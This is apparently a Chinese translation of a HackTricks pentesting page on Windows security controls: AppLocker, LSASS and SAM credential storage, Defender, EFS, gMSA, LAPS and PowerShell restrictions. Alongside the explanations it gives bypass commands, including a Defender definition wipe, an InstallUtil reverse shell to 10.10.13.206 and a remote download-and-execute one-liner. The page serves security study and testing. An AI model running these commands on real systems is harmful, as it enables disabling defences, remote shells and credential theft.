# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

应用程序白名单是一个已批准软件应用程序或可执行文件的列表，这些应用程序或文件允许存在并在系统上运行。其目标是保护环境免受有害 malware 和未经批准的软件影响，避免这些软件不符合组织的具体业务需求。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，可让系统管理员控制**用户可以运行哪些应用程序和文件**。它为可执行文件、scripts、Windows installer 文件、DLL、打包应用程序和打包应用程序安装程序提供**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些限制都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
此注册表路径包含 AppLocker 应用的配置和策略，可用于查看系统当前强制执行的规则集合：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 用于 Bypass AppLocker Policy 的有用 **Writable folders**：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 中执行任何内容，则可以使用其中的 **writable folders** 来 **bypass this**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 通常被**信任**的 [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **编写不当的规则也可能被绕过**
- 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任意位置创建一个名为 **`allowed`** 的**文件夹**，这样它就会被允许。
- 组织通常也会重点关注**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但会忘记其他的 [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- 由于 DLL enforcement 会给系统带来额外负载，并且需要进行大量测试以确保不会导致任何功能损坏，因此它**很少被启用**。所以使用 **DLL 作为 backdoor 将有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell** 代码并绕过 AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## 凭据存储

### Security Accounts Manager (SAM)

本地凭据存储在此文件中，密码经过哈希处理。

### Local Security Authority (LSA) - LSASS

出于 Single Sign-On 的原因，**凭据**（哈希值）会**保存**在此子系统的**内存**中。\
**LSA** 负责管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**等。\
对于本地登录，LSA 会负责检查 **SAM** 文件中提供的**凭据**；对于域用户，LSA 会与**域控制器**通信以完成身份验证。

**凭据**会**保存**在 **LSASS 进程**中：Kerberos tickets、NT 和 LM hashes，以及可轻松解密的密码。

### LSA secrets

LSA 可能会在磁盘上保存一些凭据：

- Active Directory 的计算机账户密码（无法访问的域控制器）。
- Windows 服务账户的密码
- scheduled tasks 的密码
- 其他内容（IIS applications 的密码等）

### NTDS.dit

这是 Active Directory 的数据库。它仅存在于 Domain Controllers 中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10、Windows 11 以及 Windows Server 各版本中提供的 Antivirus。它会**阻止**常见的 pentesting 工具，例如 **`WinPEAS`**。不过，有一些方法可以**绕过这些保护机制**。

### 检查

要检查 **Defender** 的**状态**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值以确认其是否处于活动状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令对其进行枚举：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS 通过加密保护文件，使用一种称为 **File Encryption Key (FEK)** 的 **对称密钥**。该密钥使用用户的 **公钥** 加密，并存储在加密文件的 $EFS **备用数据流**中。需要解密时，使用用户数字证书对应的 **私钥**，从 $EFS 流中解密 FEK。更多详细信息请参见[此处](https://en.wikipedia.org/wiki/Encrypting_File_System)。

**无需用户发起的解密场景**包括：

- 当文件或文件夹被移动到非 EFS 文件系统（如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
- 通过 SMB/CIFS 协议在网络上发送的加密文件，会在传输前解密。

这种加密方式允许所有者**透明访问**加密文件。但是，仅更改所有者的密码并登录，并不能解密文件。

**关键要点**：

- EFS 使用对称 FEK，并使用用户的公钥对其加密。
- 解密时使用用户的私钥访问 FEK。
- 在特定条件下会自动解密，例如复制到 FAT32 或通过网络传输。
- 所有者无需执行其他操作即可访问加密文件。

### 检查 EFS 信息

通过检查此路径是否存在，确认某个**用户**是否**使用过**此**服务**：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file\> 检查**谁**可以**访问**该文件\
也可以在文件夹中使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### 作为 Authority System

此方法要求**受害用户**在主机上**运行**一个**进程**。如果满足条件，可以从 `meterpreter` 会话中模拟该用户的进程令牌（来自 `incognito` 的 `impersonate_token`）。也可以 `migrate` 到该用户的进程中。

#### 知道用户密码

Mimikatz 可以导入用户的证书和私钥，然后使用它们解密受 EFS 保护的文件。<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft 开发了 **Group Managed Service Accounts (gMSA)**，用于简化 IT 基础设施中服务账户的管理。与通常启用“**Password never expire**”设置的传统服务账户不同，gMSA 提供了更安全且更易管理的解决方案：

- **自动密码管理**：gMSA 使用由 240 个字符组成的复杂密码，并根据域或计算机策略自动更改。此过程由 Microsoft 的 Key Distribution Service (KDC) 处理，无需手动更新密码。
- **增强安全性**：这些账户不会被锁定，也不能用于交互式登录，从而提高了安全性。
- **支持多个主机**：gMSA 可以在多个主机之间共享，非常适合运行在多台服务器上的服务。
- **计划任务功能**：与 managed service accounts 不同，gMSA 支持运行计划任务。
- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生变化时，系统会自动更新 Service Principal Name (SPN)，从而简化 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由 Domain Controllers (DCs) 每 30 天自动重置一次。该密码是一个称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据 blob，只能由授权管理员以及安装了 gMSA 的服务器检索，从而确保安全的环境。要访问此信息，需要使用 LDAPS 等安全连接，或者连接必须通过 'Sealing & Secure' 进行身份验证。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** 读取此密码。
```
/GMSAPasswordReader --AccountName jkohler
```
[**在这篇文章中了解更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

此外，请查看这个[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行 **NTLM relay attack** 来**读取** **gMSA** 的**密码**。<sup>[[3]](#references)</sup>

## LAPS

可从 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) 下载的 **Local Administrator Password Solution (LAPS)** 支持管理本地 Administrator 密码。这些密码经过**随机化**处理、具有唯一性并且会**定期更改**，集中存储在 Active Directory 中。通过 ACL 可将这些密码的访问权限限制为授权用户。获得足够权限后，用户即可读取本地 admin 密码。

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **限制了许多有效使用 PowerShell 所需的功能**，例如阻止 COM 对象、仅允许使用经过批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等。

### **检查**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
在当前的 Windows 中，该 Bypass 无法工作，但你可以使用[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **添加引用** -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并将项目**更改为 .Net4.5**。

#### 直接 bypass：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### 反向 shell：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell**代码并绕过受限模式。更多信息请参阅：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[1]](#references)</sup>

## PS 执行策略

默认情况下，它被设置为 **restricted**。绕过此策略的主要方式：<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
更多内容可以在[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>找到

## Security Support Provider Interface (SSPI)

这是一个可用于对用户进行身份验证的 API。

SSPI 负责为希望进行通信的两台机器寻找合适的协议。首选方法是 Kerberos。随后，SSPI 将协商要使用的身份验证协议。这些身份验证协议称为 Security Support Provider (SSP)，以 DLL 的形式位于每台 Windows 机器中，并且两台机器必须支持相同的 SSP 才能进行通信。

### Main SSPs

- **Kerberos**：首选协议
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性原因
- %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web 服务器和 LDAP，密码以 MD5 hash 的形式存在
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**：SSL 和 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商要使用的协议（Kerberos 或 NTLM，其中 Kerberos 为默认协议）
- %windir%\Windows\System32\lsasrv.dll

#### 协商过程可能提供多种方法，也可能只提供一种方法。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项可为**需要提升权限的操作显示同意提示**的功能。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [绕过 AppLocker 和 PowerShell 受限语言模式](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [如何解密 EFS 文件](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA 的 Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [绕过 PowerShell 执行策略的 15 种方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
